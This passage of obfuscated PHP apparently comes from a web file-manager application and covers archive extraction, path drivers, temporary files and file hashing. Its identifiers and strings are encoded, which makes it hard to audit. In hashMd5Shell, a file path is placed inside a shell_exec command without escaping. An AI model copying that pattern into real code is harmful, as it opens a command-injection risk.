in_array(IO::ext($ÂĞ¤øûŒ[$€¿øƒ‘²[200]]), array($€¿øƒ‘²[342], $€¿øƒ‘²[1228], $€¿øƒ‘²[1229], $€¿øƒ‘²[1230], $€¿øƒ‘²[1231], $€¿øƒ‘²[1232])); if (!$ö‹øÄë && ($òØ‡Ê¶«[$€¿øƒ‘²[1223]] == -1 || $ÊÛ§Š©)) { $áÄ”ëÑô = $ÂĞ¤øûŒ[$€¿øƒ‘²[1224]] . get_path_this($ÂĞ¤øûŒ[$€¿øƒ‘²[200]]) . $€¿øƒ‘²[1233]; if (!IO::exist($áÄ”ëÑô)) { $ò°šŒá” = $òØ‡Ê¶«[$€¿øƒ‘²[1223]] == -1 ? get_path_ext(IO::pathThis($æŞ ÚÇÊ[$€¿øƒ‘²[84]])) : get_path_ext($ÂĞ¤øûŒ[$€¿øƒ‘²[200]]); $¾‘Åæ„ = KodArchive::listContent(self::iconvSystem($ÂĞ¤øûŒ[$€¿øƒ‘²[200]]), !0, $ò°šŒá”); self::unzipErrorCheck($¾‘Åæ„, array($€¿øƒ‘²[1234], $æŞ ÚÇÊ, $ÂĞ¤øûŒ)); @file_put_contents($áÄ”ëÑô, json_encode($¾‘Åæ„[$€¿øƒ‘²[1235]])); } return @json_decode(IO::getContent($áÄ”ëÑô), !0); } IO::fileOut($ÂĞ¤øûŒ[$€¿øƒ‘²[200]], $ö‹øÄë, get_path_this($òØ‡Ê¶«[$€¿øƒ‘²[32]])); die; } private static function zipFileList($õÜñ¡º, $Òê«ÁÖÕ = false) { $şûâ ±Ğ =& $_SERVER[¹ş¤¶ĞÖ]; $Ÿ³ñÏÀé = array(); foreach ($õÜñ¡º as $Í´ÖûÃí) { $»ÃŸ å = $Í´ÖûÃí[$şûâ ±Ğ[84]]; if ($Òê«ÁÖÕ) { $»ÃŸ å = self::copy($Í´ÖûÃí[$şûâ ±Ğ[84]], $Òê«ÁÖÕ, $şûâ ±Ğ[844]); } else { $·Ë±· ¢ = self::init($Í´ÖûÃí[$şûâ ±Ğ[84]]); if ($·Ë±· ¢->getType() == $şûâ ±Ğ[106]) { $»ÃŸ å = $·Ë±· ¢->path; } } if ($»ÃŸ å && self::local()->exist($»ÃŸ å)) { $Ÿ³ñÏÀé[$Í´ÖûÃí[$şûâ ±Ğ[84]]] = $»ÃŸ å; } } if (!empty($Ÿ³ñÏÀé)) { return array_values($Ÿ³ñÏÀé); } show_json(LNG($şûâ ±Ğ[1198]), !1); } private static function localFilePath($Ùıß×±) { $¬¥ÉëÊû =& $_SERVER[¹ş¤¶ĞÖ]; $ôÊ˜×‘ = KodIO::parse($Ùıß×±); if ($ôÊ˜×‘[$¬¥ÉëÊû[33]] == KodIO::KOD_SOURCE) { $äˆË©¾İ = Model($¬¥ÉëÊû[851])->fileInfoGet(KodIO::sourceID($Ùıß×±)); if (!$äˆË©¾İ[$¬¥ÉëÊû[84]]) { show_json($¬¥ÉëÊû[1236], !1); } $Ùıß×± = $äˆË©¾İ[$¬¥ÉëÊû[84]]; } $ù¤éÏâ = self::init($Ùıß×±); if ($ù¤éÏâ->pathParse[$¬¥ÉëÊû[1184]]) { $Ùıß×± = $ù¤éÏâ->pathParse[$¬¥ÉëÊû[1184]]; $ù¤éÏâ = self::init($Ùıß×±); } $üë¶¡­° = $ù¤éÏâ->getType(); if ($üë¶¡­° == $¬¥ÉëÊû[106] || $üë¶¡­° == $¬¥ÉëÊû[1237]) { if (!$ù¤éÏâ->exist($ù¤éÏâ->path)) { show_json(LNG($¬¥ÉëÊû[105]), !1); } return $ù¤éÏâ->path; } return !1; } public static function unzipPart($€’•âñ‹, $Ì†ÉÓ¶ = -1) { $êªä®« =& $_SERVER[¹ş¤¶ĞÖ]; $Ñ©¨˜©” = IO::pathThis($€’•âñ‹); if (!$Ì†ÉÓ¶ || $Ì†ÉÓ¶ == -1) { $ĞÖ‘åÑ = array(array($êªä®«[32] => $Ñ©¨˜©”, $êªä®«[1223] => -1)); $ĞÖ‘åÑ[0][$êªä®«[1238]] = $ĞÖ‘åÑ[0][$êªä®«[32]]; } else { if (is_array($Ì†ÉÓ¶)) { $ĞÖ‘åÑ = $Ì†ÉÓ¶; $èÛ¢âË¹ = count($ĞÖ‘åÑ) - 1; for ($¢ô¬ôã® = 0; $¢ô¬ôã® <= $èÛ¢âË¹; $¢ô¬ôã®++) { $‡Ìò“– = $ĞÖ‘åÑ[$¢ô¬ôã®]; $ùŠ¾ëĞ = get_path_this($‡Ìò“–[$êªä®«[32]]) . (checkExtSafe($‡Ìò“–[$êªä®«[32]]) ? $êªä®«[12] : $êªä®«[1239]); $ĞÖ‘åÑ[$¢ô¬ôã®][$êªä®«[1238]] = $êªä®«[1240] . intval($‡Ìò“–[$êªä®«[1223]]) . $êªä®«[415] . $ùŠ¾ëĞ; if ($¢ô¬ôã® == 0) { continue; } $ĞÖ‘åÑ[$¢ô¬ôã®][$êªä®«[1238]] = $ĞÖ‘åÑ[$¢ô¬ôã® - 1][$êªä®«[1238]] . $êªä®«[1241] . $ĞÖ‘åÑ[$¢ô¬ôã®][$êªä®«[1238]]; } } } if (!is_array($ĞÖ‘åÑ) || count($ĞÖ‘åÑ) == 0) { return !1; } $Ê“…ŸË† = $ĞÖ‘åÑ[count($ĞÖ‘åÑ) - 1]; if (!IO::exist($€’•âñ‹)) { return !1; } $Áõ·ö¢¶ = TEMP_FILES . $êªä®«[1242] . kodIO::hashPathSafe($€’•âñ‹) . $êªä®«[8]; $œÚ×ùñğ = $Áõ·ö¢¶ . $Ê“…ŸË†[$êªä®«[1238]]; mk_dir($Áõ·ö¢¶); file_put_contents(TEMP_FILES . $êªä®«[1217], $êªä®«[12]); if (IO::exist($œÚ×ùñğ)) { return array($êªä®«[200] => $œÚ×ùñğ, $êªä®«[1222] => $ĞÖ‘åÑ, $êªä®«[1224] => $Áõ·ö¢¶); } $Ãôñ«‡ = self::localFilePath($€’•âñ‹); if (!$Ãôñ«‡) { $Ãôñ«‡ = $Áõ·ö¢¶ . $êªä®«[1243]; if (!IO::exist($Ãôñ«‡)) { self::copy($€’•âñ‹, $Áõ·ö¢¶, !1, get_path_this($Ãôñ«‡)); } } if (!$Ãôñ«‡ || !IO::exist($Ãôñ«‡)) { return !1; } if ($Ê“…ŸË†[$êªä®«[1223]] == -1) { return array($êªä®«[200] => $Ãôñ«‡, $êªä®«[1222] => $ĞÖ‘åÑ, $êªä®«[1224] => $Áõ·ö¢¶); } $òª˜šÔÏ = $Ãôñ«‡; foreach ($ĞÖ‘åÑ as $¢ô¬ôã® => $‡Ìò“–) { if (!$‡Ìò“– || $‡Ìò“–[$êªä®«[1223]] == $êªä®«[1221]) { break; } if (substr($‡Ìò“–[$êªä®«[32]], -1, 1) == $êªä®«[8]) { break; } $Šè‡–•º = in_array(get_path_ext($‡Ìò“–[$êªä®«[1238]]), array($êªä®«[342], $êªä®«[1228], $êªä®«[1229], $êªä®«[1230], $êªä®«[1231], $êªä®«[1232])); $Ï×©ÃŒ½ = $¢ô¬ôã® == count($ĞÖ‘åÑ) - 1 && $Šè‡–•º; $äÛøø³– = $Áõ·ö¢¶ . $‡Ìò“–[$êªä®«[1238]]; $»„É³İÍ = $Áõ·ö¢¶ . get_path_this($‡Ìò“–[$êªä®«[32]]); if (IO::exist($äÛøø³–)) { $òª˜šÔÏ = $äÛøø³–; continue; } $ÚÉ¤ò÷ = $¢ô¬ôã® == 0 ? get_path_ext($Ñ©¨˜©”) : get_path_ext($òª˜šÔÏ); $ö«öå™é = KodArchive::extract(self::iconvSystem($òª˜šÔÏ), $Áõ·ö¢¶, $‡Ìò“–[$êªä®«[1223]], $æŠˆ¿à¹, $ÚÉ¤ò÷); self::unzipErrorCheck($ö«öå™é, array($êªä®«[1244], $€’•âñ‹, $ĞÖ‘åÑ, $‡Ìò“–, $äÛøø³–)); if (IO::exist($»„É³İÍ)) { IO::rename($»„É³İÍ, get_path_this($äÛøø³–)); } $òª˜šÔÏ = $äÛøø³–; } $œÚ×ùñğ = $òª˜šÔÏ; return array($êªä®«[200] => $òª˜šÔÏ, $êªä®«[1222] => $ĞÖ‘åÑ, $êªä®«[1224] => $Áõ·ö¢¶); } private static function unzipErrorCheck($Ü…şËœ¿, $Ñ¹×¸Şà = false) { $ìö¥ë˜ =& $_SERVER[¹ş¤¶ĞÖ]; if ($Ü…şËœ¿[$ìö¥ë˜[1245]]) { return !0; } write_log(array($ìö¥ë˜[1246], $Ü…şËœ¿, $Ñ¹×¸Şà), $ìö¥ë˜[1247]); show_json($ìö¥ë˜[1248] . json_encode($Ü…şËœ¿[$ìö¥ë˜[1235]]), !1); die; } } goto E¼²ØŠŒåç; D•±–ºÄî: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $»ì È´‰ =& $_SERVER[¹ş¤¶ĞÖ]; $this->objectDriver = array($»ì È´‰[60], $»ì È´‰[61], $»ì È´‰[62], $»ì È´‰[63], $»ì È´‰[64], $»ì È´‰[65], $»ì È´‰[66], $»ì È´‰[67], $»ì È´‰[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($¬æ·°İ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($¬æ·°İ, $_SERVER[¹ş¤¶ĞÖ][8]); } return $¬æ·°İ; } public function iconvApp($èÏµáÁ†) { return $èÏµáÁ†; } public function iconvSystem($Îµˆûè²) { return $Îµˆûè²; } public function iconvTo($Û½…‰¨, $ÃîŸç×, $ÀáÑÊò) { $È‡êåÎ» =& $_SERVER[¹ş¤¶ĞÖ]; if (!$Û½…‰¨ || !function_exists($È‡êåÎ»[69])) { return $Û½…‰¨; } static $÷±Éî¬ù = array(); $Ş³ÎŸ†Â = $ÃîŸç× . $È‡êåÎ»[70] . $ÀáÑÊò . $È‡êåÎ»[71] . $Û½…‰¨; if (isset($÷±Éî¬ù[$Ş³ÎŸ†Â])) { return $÷±Éî¬ù[$Ş³ÎŸ†Â]; } if (function_exists($È‡êåÎ»[72])) { $Š¡àßÏ¥ = @mb_convert_encoding($Û½…‰¨, $ÀáÑÊò, $ÃîŸç×); } else { $Š¡àßÏ¥ = @iconv($ÃîŸç×, $ÀáÑÊò, $Û½…‰¨); } $Š¡àßÏ¥ = $Š¡àßÏ¥ ? $Š¡àßÏ¥ : $Û½…‰¨; if (strstr($Š¡àßÏ¥, $È‡êåÎ»[73])) { $Š¡àßÏ¥ = str_replace($È‡êåÎ»[73], $È‡êåÎ»[11], $Š¡àßÏ¥); } $÷±Éî¬ù[$ÃîŸç× . $È‡êåÎ»[70] . $ÀáÑÊò . $È‡êåÎ»[71] . $Û½…‰¨] = $Š¡àßÏ¥; $÷±Éî¬ù[$ÀáÑÊò . $È‡êåÎ»[70] . $ÃîŸç× . $È‡êåÎ»[71] . $Û½…‰¨] = $Û½…‰¨; $÷±Éî¬ù[$ÀáÑÊò . $È‡êåÎ»[70] . $ÃîŸç× . $È‡êåÎ»[71] . $Š¡àßÏ¥] = $Û½…‰¨; $÷±Éî¬ù[$ÃîŸç× . $È‡êåÎ»[70] . $ÀáÑÊò . $È‡êåÎ»[71] . $Š¡àßÏ¥] = $Š¡àßÏ¥; return $Š¡àßÏ¥; } public function getPathInner($½ò®Ä€) { $¦‘ŠÌç€ = IO::init($½ò®Ä€); return $¦‘ŠÌç€->path; } public function getPathOuter($ç†ßÒÆ) { $ÜœÄüµğ =& $_SERVER[¹ş¤¶ĞÖ]; $ê¢•ÒÒ = strlen(trim($this->pathBase, $ÜœÄüµğ[8])); $ç†ßÒÆ = substr(trim($ç†ßÒÆ, $ÜœÄüµğ[8]), $ê¢•ÒÒ); return $this->pathDriver . $ÜœÄüµğ[8] . ltrim($ç†ßÒÆ, $ÜœÄüµğ[8]); } public function isParentOf($Ó¦•Ìšê, $å¹©µÕ) { $óĞ‚ó…§ =& $_SERVER[¹ş¤¶ĞÖ]; $Ó¦•Ìšê = rtrim(strtolower($Ó¦•Ìšê), $óĞ‚ó…§[8]) . $óĞ‚ó…§[8]; $å¹©µÕ = rtrim(strtolower($å¹©µÕ), $óĞ‚ó…§[8]) . $óĞ‚ó…§[8]; $·†àÁòÁ = strpos($å¹©µÕ, $Ó¦•Ìšê) === 0; return $·†àÁòÁ; } public function getType() { $’ÊÔå¦ó =& $_SERVER[¹ş¤¶ĞÖ]; $­ïÃ…Œï = str_replace($’ÊÔå¦ó[74], $’ÊÔå¦ó[12], get_class($this)); return strtolower($­ïÃ…Œï); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($¦×²µº, $Îè·¹šÎ) { $êŠçæ•¬ =& $_SERVER[¹ş¤¶ĞÖ]; $ÈõÉĞ±™ = rtrim($¦×²µº, $êŠçæ•¬[8]) . $êŠçæ•¬[8] . $Îè·¹šÎ; $›öË¨´ö = $this->exist($ÈõÉĞ±™); return $›öË¨´ö ? $ÈõÉĞ±™ : !1; } public function setModifyTime($€×Ç—Œ, $©‰ÒÅíˆ = '') { } public function renameObject($ŞéòÆ˜¬, $÷³æãÏ) { $íæ¿Œ¹Ì = $÷³æãÏ; $ŞéòÆ˜¬ = $this->getPathOuter($ŞéòÆ˜¬); $÷³æãÏ = $this->pathFather($ŞéòÆ˜¬) . $÷³æãÏ; $ª”Ä‡àù = IO::copy($ŞéòÆ˜¬, $this->pathFather($ŞéòÆ˜¬), REPEAT_RENAME_FOLDER, $íæ¿Œ¹Ì); if ($ª”Ä‡àù) { IO::remove($ŞéòÆ˜¬); } return $ª”Ä‡àù ? $÷³æãÏ : !1; } public function tempFile($ğ±¼¤à = '', $„‰Ò¼Á = '') { if (!$ğ±¼¤à) { $ğ±¼¤à = rand_string(15); } $…†¾¾è« = TEMP_FILES . rand_string(15) . $_SERVER[¹ş¤¶ĞÖ][8]; @mkdir($…†¾¾è«, DEFAULT_PERRMISSIONS, !0); $á“¡Ûøğ = $…†¾¾è« . $ğ±¼¤à; @touch($á“¡Ûøğ); if ($„‰Ò¼Á) { file_put_contents($á“¡Ûøğ, $„‰Ò¼Á); } return $á“¡Ûøğ; } public function tempFileRemve($—ÇŞ¼’ˆ) { @unlink($—ÇŞ¼’ˆ); @rmdir($this->pathFather($—ÇŞ¼’ˆ)); } public function mkfile($“†â½ú‹, $áòìú´¥ = '', $ƒ’°Ø… = REPEAT_RENAME) { } public function mkdir($§¥‹…¬´, $Â¯ààƒ© = REPEAT_SKIP) { } public function delFile($Ş›Éõ¹Ü) { } public function delFolder($Šà«Í ß) { } public function copyFile($¡ÉíÏÓ, $€Ñ”²ğÉ) { } public function moveFile($©„­Ö´Ê, $Â¨İ°¯Ğ) { } public function remove($á…ÇĞ‡¯) { if ($this->isFile($á…ÇĞ‡¯)) { return $this->delFile($á…ÇĞ‡¯); } return $this->delFolder($á…ÇĞ‡¯); } public function rename($ş°ÒÚ™ê, $¿ÕäÏ¶Á) { } public function exist($¯÷¶¹Œ›) { } public function findByHash($ñß÷ÓÌı = '', $âçğ©âê = '') { return !1; } public function isFile($Â‰ªé´’) { } public function isFolder($âßò¼®Ï) { } public function size($øˆŸôôÉ) { } public function info($ªõ¸è¨«) { } public function infoSimple($â·ıöÅ) { return $this->info($â·ıöÅ); } public function infoAuth($óãê§‹Ü) { return $this->info($óãê§‹Ü); } public function infoFull($‡–â) { return $this->info($‡–â); } public function infoWithChildren($¸éÓ¦ã) { $ˆ°¾ş‚— =& $_SERVER[¹ş¤¶ĞÖ]; static $‘Û’íœÀ = array(); if (isset($‘Û’íœÀ[$¸éÓ¦ã])) { return $‘Û’íœÀ[$¸éÓ¦ã]; } $Ïí„æÖâ = $this->info($¸éÓ¦ã); if ($Ïí„æÖâ && $Ïí„æÖâ[$ˆ°¾ş‚—[33]] == $ˆ°¾ş‚—[75]) { $Öú’ÌÓŞ = array($ˆ°¾ş‚—[76] => 0, $ˆ°¾ş‚—[77] => 0, $ˆ°¾ş‚—[78] => 0); $this->infoChildren($¸éÓ¦ã, $Öú’ÌÓŞ); $Ïí„æÖâ[$ˆ°¾ş‚—[76]] = $Öú’ÌÓŞ[$ˆ°¾ş‚—[76]]; $Ïí„æÖâ[$ˆ°¾ş‚—[79]] = array($ˆ°¾ş‚—[80] => $Öú’ÌÓŞ[$ˆ°¾ş‚—[77]], $ˆ°¾ş‚—[81] => $Öú’ÌÓŞ[$ˆ°¾ş‚—[78]]); $‘Û’íœÀ[$¸éÓ¦ã] = $Ïí„æÖâ; } return $Ïí„æÖâ; } public function listPath($š§¶Øû, $·‡‡“ô® = false) { } public function has($–ü†Â¨©, $éÇƒÔ¤ = false, $˜¢šæáˆ = false) { } public function canRead($ËÃóØ¸) { } public function canWrite($Ñ ›§ªÊ) { } public function getContent($»ò‘ĞÎş) { } public function setContent($‹Â™ë’¶, $¸òí¯úü = '') { } protected function infoChildren($Âü›½°, &$šÜº¯½Ù) { $ÖíŒ“”è =& $_SERVER[¹ş¤¶ĞÖ]; check_abort_echo(); $®‹Û–À = $this->listPath($Âü›½°, !0); $®‹Û–À = array_merge($®‹Û–À[$ÖíŒ“”è[82]], $®‹Û–À[$ÖíŒ“”è[83]]); foreach ($®‹Û–À as $Ãêã™) { if ($Ãêã™[$ÖíŒ“”è[33]] == $ÖíŒ“”è[75]) { $šÜº¯½Ù[$ÖíŒ“”è[78]]++; $‹–‚ãîØ = $this->getPathInner($Ãêã™[$ÖíŒ“”è[84]]); $this->infoChildren($‹–‚ãîØ, $šÜº¯½Ù); } else { $šÜº¯½Ù[$ÖíŒ“”è[77]]++; $šÜº¯½Ù[$ÖíŒ“”è[76]] += $Ãêã™[$ÖíŒ“”è[76]]; } } } public function fileSubstr($Ğ¸¼ª§, $ªò§˜œâ, $˜–Ö£°) { } public function listAll($øĞ·Ò) { } public function listAllMake($¯Ø…¯´½, &$˜ûê¥¼«) { $‰Ä™µé” =& $_SERVER[¹ş¤¶ĞÖ]; check_abort_echo(); $÷ˆ–ò¹ì = $this->listPath($¯Ø…¯´½, !0); if (!$÷ˆ–ò¹ì) { return; } $Â¤’ì®‚ = array_merge($÷ˆ–ò¹ì[$‰Ä™µé”[82]], $÷ˆ–ò¹ì[$‰Ä™µé”[83]]); foreach ($Â¤’ì®‚ as $¯ ­óà—) { $¦’•˜¶í = $¯ ­óà—[$‰Ä™µé”[33]] == $‰Ä™µé”[75]; $ŒËµç© = array($‰Ä™µé”[84] => $¯ ­óà—[$‰Ä™µé”[84]], $‰Ä™µé”[75] => $¦’•˜¶í); if (isset($¯ ­óà—[$‰Ä™µé”[76]])) { $ŒËµç©[$‰Ä™µé”[76]] = $¯ ­óà—[$‰Ä™µé”[76]]; } if (isset($¯ ­óà—[$‰Ä™µé”[85]])) { $ŒËµç©[$‰Ä™µé”[85]] = $¯ ­óà—[$‰Ä™µé”[85]]; } if (!$¦’•˜¶í) { $˜ûê¥¼«[] = $ŒËµç©; continue; } $˜ûê¥¼«[] = $ŒËµç©; $€‹×µÏÙ = $¯ ­óà—[$‰Ä™µé”[84]]; $Í˜ñ¸‚ = $this->pathDriver; if (substr($¯ ­óà—[$‰Ä™µé”[84]], 0, strlen($Í˜ñ¸‚)) == $Í˜ñ¸‚) { $€‹×µÏÙ = substr($€‹×µÏÙ, strlen($Í˜ñ¸‚)); } $this->listAllMake($€‹×µÏÙ, $˜ûê¥¼«); } } public function listAllSimple($æ£›«ùÁ, $¶´÷±–… = false) { $»“Şêà» = $this->listAll($æ£›«ùÁ); return $this->listAllSimpleMake($»“Şêà», $this->getPathOuter($æ£›«ùÁ), $¶´÷±–…); } public function listAllSimpleMake($¹ïĞ•–Û, $èšÓ¦Í, $æÍ¢Ùù¤) { $‡½ä³×Ş =& $_SERVER[¹ş¤¶ĞÖ]; $µßŠ¶± = array(); $èšÓ¦Í = rtrim(get_path_father($èšÓ¦Í), $‡½ä³×Ş[8]) . $‡½ä³×Ş[8]; foreach ($¹ïĞ•–Û as $–š™Êİ¿) { $É‘Âšûğ = array($‡½ä³×Ş[84] => $–š™Êİ¿[$‡½ä³×Ş[84]], $‡½ä³×Ş[86] => $–š™Êİ¿[$‡½ä³×Ş[84]], $‡½ä³×Ş[75] => $–š™Êİ¿[$‡½ä³×Ş[75]]); if (isset($–š™Êİ¿[$‡½ä³×Ş[76]]) && !$–š™Êİ¿[$‡½ä³×Ş[75]]) { $É‘Âšûğ[$‡½ä³×Ş[76]] = $–š™Êİ¿[$‡½ä³×Ş[76]]; } if (isset($–š™Êİ¿[$‡½ä³×Ş[85]])) { $É‘Âšûğ[$‡½ä³×Ş[85]] = $–š™Êİ¿[$‡½ä³×Ş[85]]; } if (is_array($–š™Êİ¿[$‡½ä³×Ş[87]])) { $É‘Âšûğ[$‡½ä³×Ş[86]] = $–š™Êİ¿[$‡½ä³×Ş[87]][$‡½ä³×Ş[84]]; $É‘Âšûğ[$‡½ä³×Ş[76]] = $–š™Êİ¿[$‡½ä³×Ş[87]][$‡½ä³×Ş[76]]; $É‘Âšûğ[$‡½ä³×Ş[85]] = $–š™Êİ¿[$‡½ä³×Ş[87]][$‡½ä³×Ş[85]]; } else { if (substr($–š™Êİ¿[$‡½ä³×Ş[84]], 0, strlen($èšÓ¦Í)) == $èšÓ¦Í) { $É‘Âšûğ[$‡½ä³×Ş[84]] = substr($–š™Êİ¿[$‡½ä³×Ş[84]], strlen($èšÓ¦Í)); } } $Ô€•£ğ™ = $–š™Êİ¿[$‡½ä³×Ş[75]] ? $‡½ä³×Ş[8] : $‡½ä³×Ş[12]; $É‘Âšûğ[$‡½ä³×Ş[86]] = rtrim($É‘Âšûğ[$‡½ä³×Ş[86]], $‡½ä³×Ş[8]) . $Ô€•£ğ™; $É‘Âšûğ[$‡½ä³×Ş[84]] = $‡½ä³×Ş[8] . trim($É‘Âšûğ[$‡½ä³×Ş[84]], $‡½ä³×Ş[8]) . $Ô€•£ğ™; if (!$æÍ¢Ùù¤) { $¯ã•²É’ = explode($‡½ä³×Ş[8], trim($É‘Âšûğ[$‡½ä³×Ş[84]], $‡½ä³×Ş[8])); $É‘Âšûğ[$‡½ä³×Ş[84]] = $‡½ä³×Ş[8] . implode($‡½ä³×Ş[8], array_slice($¯ã•²É’, 1)) . $Ô€•£ğ™; } $µßŠ¶±[] = $É‘Âšûğ; } return array_sort_by($µßŠ¶±, $‡½ä³×Ş[84]); } public function upload($²ÀÕø‘, $„Ö¯»®, $ı“ßûŸı = false, $”ËàÂ¸Ô = REPEAT_REPLACE) { } public function uploadFileByID($èõ³÷Ë’, $­Š°šùø, $È—£ˆÚ„) { } public function uploadFileByPath($Ş«¿€Ëò, $©Ñ®«Ü, $Âİì¢‡‡ = array()) { } public function isUploadServer() { $ñª…ÛÉæ =& $_SERVER[¹ş¤¶ĞÖ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ñª…ÛÉæ[88]) { return !0; } return $GLOBALS[$ñª…ÛÉæ[6]][$ñª…ÛÉæ[89]][$ñª…ÛÉæ[90]]; } public function isFileOutServer() { $ªû±¥Ş =& $_SERVER[¹ş¤¶ĞÖ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ªû±¥Ş[88]) { return !0; } return $GLOBALS[$ªû±¥Ş[6]][$ªû±¥Ş[89]][$ªû±¥Ş[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($¶¹½œñı) { $×Í‡ËÆ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->isCdnHost()) { return $¶¹½œñı; } return str_replace(trim(get_url_root($¶¹½œñı), $×Í‡ËÆ[8]), trim($this->cdnHost, $×Í‡ËÆ[8]), $¶¹½œñı); } public function uploadLink($ÊÀ¦£›‹, $â¹û¤«Û = 0) { $ŸÁó‹Ïµ =& $_SERVER[¹ş¤¶ĞÖ]; if ($this->isUploadServer()) { return; } $¼úªàİ = $this->getType(); if (!in_array($¼úªàİ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $˜ñ’åå = 1024 * 1024 * 10; $‰Ÿµ…İ“ = $â¹û¤«Û <= $˜ñ’åå ? $ŸÁó‹Ïµ[92] : $ŸÁó‹Ïµ[93]; $«³Ø¨ ¿ = (!$â¹û¤«Û ? 1 : ceil($â¹û¤«Û / pow(1024, 3))) * 3600 * 4; $—ÔŠÃÕ = $this->{$‰Ÿµ…İ“}($ÊÀ¦£›‹, $«³Ø¨ ¿); if ($—ÔŠÃÕ) { $—ÔŠÃÕ[$ŸÁó‹Ïµ[94]] = $ÊÀ¦£›‹; $—ÔŠÃÕ[$ŸÁó‹Ïµ[95]] = $¼úªàİ; } return $—ÔŠÃÕ; } public function uploadFormData($à©Ş¤œà, $–À®šŸ” = 3600) { } public function multiUploadFormData($ëÚà¶Œ, $ŠÛÊğíÖ = 3600) { } public function download($†Üš¾º¦, $ªßİ™¯) { } public function ext($ê„Óô©¯) { $·Ö¹êĞÂ =& $_SERVER[¹ş¤¶ĞÖ]; if (strpos($ê„Óô©¯, $·Ö¹êĞÂ[8]) === -1) { $Ê¢’Ÿß‡ = $ê„Óô©¯; } else { $Ê¢’Ÿß‡ = $this->pathThis($ê„Óô©¯); } $èËÎë¢Ñ = $·Ö¹êĞÂ[12]; if (strstr($Ê¢’Ÿß‡, $·Ö¹êĞÂ[10])) { $èËÎë¢Ñ = substr($Ê¢’Ÿß‡, strrpos($Ê¢’Ÿß‡, $·Ö¹êĞÂ[10]) + 1); $èËÎë¢Ñ = strtolower($èËÎë¢Ñ); } if (strlen($èËÎë¢Ñ) > 3 && preg_match($·Ö¹êĞÂ[96], $èËÎë¢Ñ, $ÀûÁØ‘)) { $èËÎë¢Ñ = $·Ö¹êĞÂ[12]; } return $èËÎë¢Ñ; } public function pathThis($İ–¯‰¨ˆ) { $ÆµÃõËš =& $_SERVER[¹ş¤¶ĞÖ]; $İ–¯‰¨ˆ = str_replace($ÆµÃõËš[97], $ÆµÃõËš[8], rtrim($İ–¯‰¨ˆ, $ÆµÃõËš[8])); $¬ÑŒÕñ² = strrpos($İ–¯‰¨ˆ, $ÆµÃõËš[8]); if ($¬ÑŒÕñ² === !1) { return $İ–¯‰¨ˆ; } return substr($İ–¯‰¨ˆ, $¬ÑŒÕñ² + 1); } public function pathFather($“ÑŸõõÏ) { $Û•©‡È¡ =& $_SERVER[¹ş¤¶ĞÖ]; $“ÑŸõõÏ = str_replace($Û•©‡È¡[97], $Û•©‡È¡[8], rtrim($“ÑŸõõÏ, $Û•©‡È¡[8])); $›ÓóÚñ = strrpos($“ÑŸõõÏ, $Û•©‡È¡[8]); if ($›ÓóÚñ === !1) { return $Û•©‡È¡[12]; } return substr($“ÑŸõõÏ, 0, $›ÓóÚñ + 1); } public function hashSimple($Â°Æ›®§) { $Œœ·ô€¸ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$Â°Æ›®§) { return md5($Œœ·ô€¸[12]); } $¤²Üù‹ñ = $this->size($Â°Æ›®§); $ˆ»ÊÙÌ† = 200; $èÏ†¯°® = 50; if ($¤²Üù‹ñ <= $ˆ»ÊÙÌ† * $èÏ†¯°®) { return $this->hashMd5($Â°Æ›®§) . $¤²Üù‹ñ; } $Š³áœ‚Œ = intval($¤²Üù‹ñ / $èÏ†¯°®); $÷ÑøÁªÍ = $Œœ·ô€¸[12]; for ($©İØ«úš = 0; $©İØ«úš < $èÏ†¯°®; $©İØ«úš++) { $÷ÑøÁªÍ .= $this->fileSubstr($Â°Æ›®§, $Š³áœ‚Œ * $©İØ«úš, $ˆ»ÊÙÌ†); } $÷ÑøÁªÍ .= $this->fileSubstr($Â°Æ›®§, $¤²Üù‹ñ - $ˆ»ÊÙÌ†, $ˆ»ÊÙÌ†); return md5($÷ÑøÁªÍ) . $¤²Üù‹ñ; } public static $md5Cache = array(); public function hashMd5($İÆæÚ¸¹) { if (!$İÆæÚ¸¹) { return md5($_SERVER[¹ş¤¶ĞÖ][12]); } $İÆæÚ¸¹ = $this->iconvSystem($İÆæÚ¸¹); if (isset(self::$md5Cache[$İÆæÚ¸¹])) { return self::$md5Cache[$İÆæÚ¸¹]; } self::$md5Cache[$İÆæÚ¸¹] = $this->hashMd5Shell($İÆæÚ¸¹); if (!self::$md5Cache[$İÆæÚ¸¹]) { self::$md5Cache[$İÆæÚ¸¹] = @md5_file($İÆæÚ¸¹); } return self::$md5Cache[$İÆæÚ¸¹]; } private function hashMd5Shell($„íŒ—óå) { $ØùÄƒä =& $_SERVER[¹ş¤¶ĞÖ]; if (!$„íŒ—óå) { return md5($ØùÄƒä[12]); } if (!function_exists($ØùÄƒä[98])) { return !1; } $îïôÂğ = array($ØùÄƒä[99], $ØùÄƒä[100]); $„‘ø‘¸„ = Cache::get($ØùÄƒä[101]); if (!$„‘ø‘¸„) { $¡ò ›ò¹ = BASIC_PATH . $ØùÄƒä[102]; $¢ó™Â½» = md5_file($¡ò ›ò¹); $„‘ø‘¸„ = $ØùÄƒä[103]; foreach ($îïôÂğ as $îô«¹‘×) { $èùü«ÎÂ = shell_exec($îô«¹‘× . "\40\x22{$¡ò ›ò¹}\x22"); if ($èùü«ÎÂ && substr(trim($èùü«ÎÂ), 0, 32) == $¢ó™Â½») { $„‘ø‘¸„ = $îô«¹‘×; break; } } Cache::set($ØùÄƒä[101], $„‘ø‘¸„, 3600); } if ($„‘ø‘¸„ == $ØùÄƒä[103]) { return !1; } $èùü«ÎÂ = shell_exec($„‘ø‘¸„ . "\40\42{$„íŒ—óå}\42"); $èùü«ÎÂ = str_replace($ØùÄƒä[104], $ØùÄƒä[12], $èùü«ÎÂ); return substr($èùü«ÎÂ, 0, 32); } public function link($–º´üŞ) { return $–º´üŞ; } public function fileOut($²²è·“ç, $ìÌıî™ = false, 